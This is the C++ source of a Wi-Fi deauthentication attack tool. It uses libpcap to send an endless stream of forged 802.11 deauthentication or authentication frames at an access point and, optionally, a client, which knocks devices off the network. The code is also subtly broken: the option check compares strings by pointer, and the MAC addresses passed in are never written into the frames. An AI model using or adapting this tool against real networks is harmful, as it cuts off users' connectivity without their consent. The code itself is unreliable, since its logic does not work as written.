#include "main.h"


void usage() {
  printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
  printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void send_deauth_packet(pcap_t* handle, Mac dest_addr, Mac src_addr, Mac bss_id, bool is_deauth) {
  WiFiHeader packet;

  memset(&packet, 0, sizeof(WiFiHeader));
	packet.radioTapHeader.it_len = 12;
  packet.radioTapHeader.it_present = 0x00008004;
  
  if (is_deauth) {
	  packet.macHeader.type = 0xc;
  } else {
	  packet.macHeader.type = 0xb;
  }
 
  packet.mandatoryBody.reason_code = 0x0001;

  if (pcap_sendpacket(handle, reinterpret_cast<u_char*> (&packet), sizeof(packet))) {
    printf("packet send failed");
    exit(1);
  }
}

int main(int argc, char **argv) {
  if (argc != 3 && argc != 4 && argc != 5) {
		usage();
		exit(1);
	}

  bool is_deauth = false;
	if (argv[argc - 1] == "-") {
    is_deauth = true;
  }

  char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];


	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
    exit(1);
	}

  while (true) {
		if ((is_deauth && argc == 3) || (!is_deauth && argc == 4)) {
      send_deauth_packet(handle, Mac(argv[2]), Mac("FF:FF:FF:FF:FF:FF"), Mac(argv[2]), is_deauth);
    } else if ((is_deauth && argc == 4) || (!is_deauth && argc == 5)) {
      send_deauth_packet(handle, Mac(argv[2]), Mac(argv[3]), Mac(argv[2]), is_deauth);
      send_deauth_packet(handle, Mac(argv[3]), Mac(argv[2]), Mac(argv[2]), is_deauth);
    }
    usleep(500);
  }
}

